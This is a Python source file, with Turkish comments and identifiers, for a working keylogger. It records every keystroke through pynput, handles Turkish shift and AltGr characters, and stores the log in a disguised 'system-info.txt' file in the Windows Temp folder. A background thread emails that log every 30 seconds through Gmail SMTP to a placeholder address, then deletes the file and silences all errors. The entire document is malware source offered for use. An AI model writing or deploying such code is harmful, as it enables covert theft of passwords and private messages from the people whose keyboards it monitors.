from pynput.keyboard import Listener,Key
from email.mime.multipart import MIMEMultipart #email yapısı için
from email.mime.text import MIMEText  #emaile giden içerik
import smtplib
import os
import time
import threading


liste = list()
cpdurum = False
shdurum = False
gr_durum = False

gr_liste = ["}",">","£","#","$","½","","{","[","]"]
shliste = ["=","!","'","^","+","%","&","/","(",")"]
rakam = "0123456789"

def main():

    def bas(key):

        global liste,cpdurum,shdurum,gr_durum

        try:

            if shdurum:

                if key.char in rakam:

                    liste.append(shliste[int(key.char)])

                else:

                    if key.char == "*":

                        liste.append("?")

                    elif key.char == "-":

                        liste.append("_")

                    elif not cpdurum:

                        liste.append(key.char.upper())

                    else:

                        liste.append(key.char)



            elif gr_durum:

                if key.char in rakam:

                    liste.append(gr_liste[int(key.char)])

                else:

                    if key.char == "*":

                        liste.append("\\")

                    if key.char == "-":

                        liste.append("|")

                    if key.char == "q":

                        liste.append("@")




            elif cpdurum:

                liste.append(key.char.upper())

            else:

                liste.append(key.char)

        except AttributeError:

            if key ==  Key.space:

                liste.append(" ")

            if key == Key.enter:

                liste.append("\n")

            if key == Key.backspace:

                liste.append("'<-'")


            if key == Key.caps_lock:

                cpdurum = not cpdurum

            if key == Key.shift_r or key == Key.shift_l:

                shdurum = True

            if key == Key.alt_gr:

                gr_durum = True



        if len(liste) >= 30:

            dosya_yaz()

            liste = list()



    def birak(key):

        global shdurum,gr_durum

        if key == Key.shift_l or key == Key.shift_r:

            shdurum = False

        if key == Key.alt_gr:

            gr_durum = False


    def dosya_yaz():

        global liste

        username = os.getlogin()

        with open("C:/Users/"+username+"/Appdata/Local/Temp/system-info.txt","a",encoding = "utf-8") as file:

            for x in liste:

                file.write(x)



    with Listener(on_press=bas,on_release=birak) as listener:

        listener.join()


def mail_gonder():

    while 1:


        time.sleep(30)

        username = os.getlogin()

        konum = "C:/Users/"+username+"/Appdata/Local/Temp/system-info.txt"

        try:
            if os.path.getsize(konum) >= 60:

                with open(konum,"r",encoding = "utf-8") as file:

                    icerik = file.read()


                yapi = MIMEMultipart()

                yapi["From"] = "kimden_gidecek@gmail.com"
                yapi["To"] = "kime_gidecek@gmail.com"
                yapi["Subject"] = "keylogger_log"

                yazi = MIMEText(icerik,"plain")

                yapi.attach(yazi)

                server = smtplib.SMTP("smtp.gmail.com",587)

                server.ehlo()

                server.starttls()

                server.login("kimden_gidecek@gmail.com","kimden_gidecek_parola")

                server.sendmail("kimden_gidecek@gmail.com","kime_gidecek@gmail.com",yapi.as_string())

                server.close()

                os.remove(konum)

        except:

            pass


t1 = threading.Thread(target = main)
t2 = threading.Thread(target = mail_gonder)

t1.start()
t2.start()
